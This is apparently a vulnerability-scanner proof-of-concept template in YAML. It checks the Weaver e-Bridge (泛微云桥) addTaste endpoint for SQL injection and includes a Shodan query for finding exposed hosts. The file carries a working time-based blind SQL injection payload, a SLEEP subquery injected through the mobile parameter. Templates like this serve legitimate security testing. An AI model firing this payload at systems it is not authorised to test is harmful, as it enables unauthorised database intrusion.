id: poc-yaml-weaver-e-bridge-addtaste-sqli
info:
  name: 泛微云桥 e-Bridge addTaste接口SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: weaver-ebridge
  shodan: app="泛微-云桥e-Bridge"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP({{.t1}})))mKjk)%20OR%20%27KQZm%27=%27REcX
  expression: 'status_code == 200

    && contains(headers,"application/json")

    && contains(body,"systemname")

    && duration > t1

    && duration < t2

    '
transport: http
